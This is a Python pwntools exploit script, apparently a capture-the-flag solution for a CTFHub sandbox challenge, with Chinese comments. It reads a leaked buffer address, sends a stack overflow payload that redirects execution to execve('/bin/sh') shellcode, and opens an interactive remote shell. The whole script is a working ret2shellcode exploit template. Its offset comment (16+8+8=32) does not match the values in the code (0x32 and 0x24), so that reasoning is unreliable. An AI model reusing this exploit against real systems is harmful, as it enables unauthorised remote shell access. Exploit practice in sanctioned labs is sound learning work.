from pwn import *

context.arch = 'amd64'  # 64位程序
p = remote('challenge-946fee3b6015b0b9.sandbox.ctfhub.com', 28540)  # 替换为实际目标

# 1. 获取泄露的 buf 地址
p.recvuntil(b"[")
buf_addr = int(p.recvuntil(b"]", drop=True), 16)
log.success(f"buf address: {hex(buf_addr)}")

# 2. 生成 Shellcode（调用 execve("/bin/sh")）
shellcode = asm(shellcraft.sh())
shellcode_addr=buf_addr + 0x32  # shellcode  buf和rbp的偏移量是16+rbp的偏移量8+返回地址8=32

# 3. 构造 Payload
payload = b'a'*0x24+p64(shellcode_addr)+shellcode
# 4. 发送 Payload
p.sendline(payload)
p.interactive()  # 获取交互式 shell